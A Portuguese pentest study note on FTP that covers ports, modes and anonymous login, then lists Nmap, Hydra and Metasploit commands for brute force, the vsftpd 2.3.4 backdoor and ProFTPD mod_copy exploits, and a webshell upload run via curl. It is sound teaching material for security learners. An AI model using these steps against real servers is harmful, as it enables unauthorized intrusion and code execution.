# 📂 FTP — File Transfer Protocol

> Protocolo para transferência de arquivos entre cliente e servidor.
> Um dos serviços mais antigos da internet — e ainda presente em muitos ambientes corporativos com configurações inseguras.

---

## 🧠 O Que é FTP

FTP (File Transfer Protocol) é um protocolo da camada de aplicação (OSI L7) criado para transferência de arquivos entre sistemas em rede. Opera em modo cliente-servidor e existe desde **1971**.

**Por que ainda aparece em pentest:**
- Sistemas legados que nunca foram migrados
- Administradores que não substituíram por SFTP/FTPS
- Dispositivos embarcados (câmeras, switches, roteadores)
- Servidores de hospedagem compartilhada

---

## 🔢 Portas e Modos de Conexão

FTP usa **duas conexões simultâneas** — isso é o que mais confunde iniciantes:

| Porta | Canal | Função |
|-------|-------|--------|
| **21/TCP** | Controle (Command) | Autenticação, comandos, navegação |
| **20/TCP** | Dados (Data) | Transferência real dos arquivos |

### Modo Ativo vs Passivo

| | Modo Ativo | Modo Passivo (PASV) |
|-|-----------|---------------------|
| Quem abre a conexão de dados | **Servidor** conecta no cliente | **Cliente** conecta no servidor |
| Porta de dados | Servidor usa porta 20 | Servidor usa porta aleatória alta |
| Problema | Firewall do cliente bloqueia entrada | Firewall do servidor precisa abrir range |
| Uso atual | Raro | **Padrão moderno** |

> 💡 Na prática, quase todo FTP moderno usa modo **passivo** porque firewalls de clientes bloqueiam conexões de entrada. Se tiver problemas de conexão, tentar `passive` no cliente.

---

## 🔓 Autenticação e Login Anônimo

### Login Normal
```
Usuário: usuario
Senha: senha
```

### Login Anônimo
Permite acesso sem credencial real:
```
Usuário: anonymous
Senha: (qualquer coisa, geralmente um email)
```

**Por que verificar sempre:**
- Configuração default em alguns servidores antigos
- Administradores habilitam para "facilitar" upload/download público
- Pode expor arquivos sensíveis sem nenhuma barreira

---

## 🔐 Variantes Seguras (e por que FTP puro é problema)

| Protocolo | Segurança | Porta | Como Funciona |
|-----------|-----------|-------|---------------|
| **FTP** | ❌ Nenhuma | 21 | Tudo em texto claro — credenciais visíveis |
| **FTPS** | ✅ TLS/SSL | 990 (implícito) / 21 (explícito) | FTP com criptografia TLS |
| **SFTP** | ✅ SSH | 22 | Não é FTP — é subsistema SSH, completamente diferente |

> ⚠️ FTP transmite usuário, senha e arquivos **em texto claro**. Qualquer sniffing na rede captura as credenciais. Em ambientes monitorados com Wireshark/tcpdump, é trivial.

---

## 🛠️ Ferramentas de Enumeração e Ataque

### Nmap
```bash
# Versão do serviço FTP
nmap -sV -p21 IP

# Scripts NSE para FTP
nmap --script ftp-anon -p21 IP          # login anônimo
nmap --script ftp-banner -p21 IP        # banner do servidor
nmap --script ftp-brute -p21 IP         # brute force (lento)
nmap --script ftp-syst -p21 IP          # tipo do sistema
nmap --script ftp-vuln-cve2010-4221 -p21 IP  # vulnerabilidade ProFTPD

# Todos juntos
nmap --script "ftp-*" -p21 IP
```

---

### Metasploit
```bash
# Versão do servidor
use auxiliary/scanner/ftp/ftp_version
set RHOSTS IP
run

# Login anônimo
use auxiliary/scanner/ftp/anonymous
set RHOSTS IP
run

# Brute force
use auxiliary/scanner/ftp/ftp_login
set RHOSTS IP
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
run

# Opções úteis do ftp_login
set STOP_ON_SUCCESS true     # para no primeiro sucesso
set VERBOSE false             # reduz output
set USER_AS_PASS true         # testa usuario=senha
set BLANK_PASSWORDS true      # testa sem senha
```

---

### Cliente FTP nativo (interativo)
```bash
# Conectar
ftp IP
ftp -n IP   # sem auto-login (útil para scripts)

# Dentro do cliente FTP
ls / dir        # listar arquivos
pwd             # diretório atual
cd pasta        # navegar
get arquivo     # baixar arquivo
mget *.txt      # baixar múltiplos arquivos
put arquivo     # enviar arquivo
mput *.txt      # enviar múltiplos arquivos
binary          # modo binário (para arquivos não-texto)
ascii           # modo texto
passive         # alternar modo passivo
bye / quit      # sair
```

---

### Netcat — Banner Grabbing Manual
```bash
nc -nv IP 21
```

Captura o banner do servidor FTP — frequentemente revela nome e versão do software sem autenticar.

---

### Hydra — Brute Force Externo
```bash
hydra -l usuario -P /usr/share/wordlists/rockyou.txt ftp://IP
hydra -L users.txt -P passwords.txt ftp://IP
```

---

## 🔁 Workflow de Enumeração FTP

```bash
# 1. Confirmar serviço e versão
nmap -sV -p21 IP

# 2. Banner grab manual
nc -nv IP 21

# 3. Verificar login anônimo
nmap --script ftp-anon -p21 IP
# ou
use auxiliary/scanner/ftp/anonymous

# 4. Se anônimo habilitado → conectar e explorar
ftp IP
# usuario: anonymous
# senha: qualquer

# 5. Verificar vulnerabilidades da versão encontrada
searchsploit ProFTPD 1.3.5     # exemplo
nmap --script ftp-vuln-* -p21 IP

# 6. Brute force se necessário
use auxiliary/scanner/ftp/ftp_login
set USER_FILE users.txt
set PASS_FILE passwords.txt
run

# 7. Com credencial → acesso completo
ftp IP
# navegar, baixar arquivos sensíveis
```

---

## ⚔️ Vulnerabilidades Importantes

| Software | CVE | Tipo | Impacto |
|---------|-----|------|---------|
| **ProFTPD 1.3.5** | CVE-2015-3306 | `mod_copy` — cópia de arquivos sem auth | RCE / LFI |
| **vsftpd 2.3.4** | CVE-2011-2523 | Backdoor no binário | RCE — shell na porta 6200 |
| **ProFTPD 1.3.3c** | CVE-2010-4221 | Buffer overflow | RCE |
| **Wu-FTPd** | CVE-2001-0550 | Glob expansion | RCE |

### vsftpd 2.3.4 — Backdoor Clássico
```bash
# Verificar versão
nmap -sV -p21 IP

# Se for vsftpd 2.3.4
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS IP
run
# Abre shell na porta 6200
```

### ProFTPD 1.3.5 — mod_copy
```bash
# Módulo mod_copy permite copiar arquivos via SITE CPFR/CPTO sem autenticação
# Exemplo: copiar chave SSH para diretório web acessível
use exploit/unix/ftp/proftpd_modcopy_exec
```

---

## 📋 Servidores FTP Comuns

| Servidor | OS Principal | Notas |
|---------|-------------|-------|
| **vsftpd** | Linux | "Very Secure FTP" — padrão no Ubuntu/CentOS |
| **ProFTPD** | Linux | Muito usado em hospedagem compartilhada |
| **Pure-FTPd** | Linux | Focado em segurança |
| **FileZilla Server** | Windows | Interface gráfica — comum em PMEs |
| **IIS FTP** | Windows | Integrado ao Windows Server |
| **Wu-FTPd** | Linux (legado) | Obsoleto — muitas CVEs antigas |

---

## 🚩 Red Flags em Enumeração FTP

| Achado | Risco | Ação |
|--------|-------|------|
| Login anônimo habilitado | 🔴 Alto | Listar e baixar tudo disponível |
| FTP em texto claro (não FTPS/SFTP) | 🟡 Médio | Sniffing de credenciais viável |
| vsftpd 2.3.4 | 🔴 Crítico | Testar backdoor imediatamente |
| ProFTPD 1.3.5 | 🔴 Alto | Testar mod_copy |
| Permissão de escrita | 🔴 Alto | Upload de webshell se HTTP também aberto |
| Credencial padrão | 🔴 Crítico | admin/admin, ftp/ftp, anonymous/anonymous |

---

## 💡 FTP + HTTP = Webshell

Se o servidor tiver **FTP com escrita** e **HTTP** na mesma máquina:

```
1. Descobrir root do servidor web (geralmente /var/www/html)
2. Upload de webshell PHP via FTP
3. Acessar via HTTP → execução de código
```

```bash
# No cliente FTP
put shell.php
exit

# No browser ou curl
curl http://IP/shell.php?cmd=whoami
```

---

## 🧠 FTP vs SFTP — Confusão Comum

| | FTP | SFTP |
|-|-----|------|
| Porta | 21 | 22 |
| Protocolo base | FTP | SSH (subsistema) |
| Criptografia | ❌ Nenhuma | ✅ SSH |
| Canal de dados | Porta separada (20 ou aleatória) | Mesma conexão SSH |
| Comandos | `ftp IP` | `sftp usuario@IP` |

**SFTP não é FTP com SSL** — é um protocolo completamente diferente que roda sobre SSH.
**FTPS** é FTP com TLS — aí sim é FTP com criptografia.

---

## 📌 Relacionados

- [[SMB — Server Message Block]]
- [[FTP Enumeration com Metasploit]]
- [[Nmap — Service & OS Detection]]
- [[Nmap — NSE]]
- [[Metasploit — Fundamentos e Arquitetura]]
- [[Cheatsheet — Portas Importantes]]

#protocolo/ftp #recon/ativo #exploração
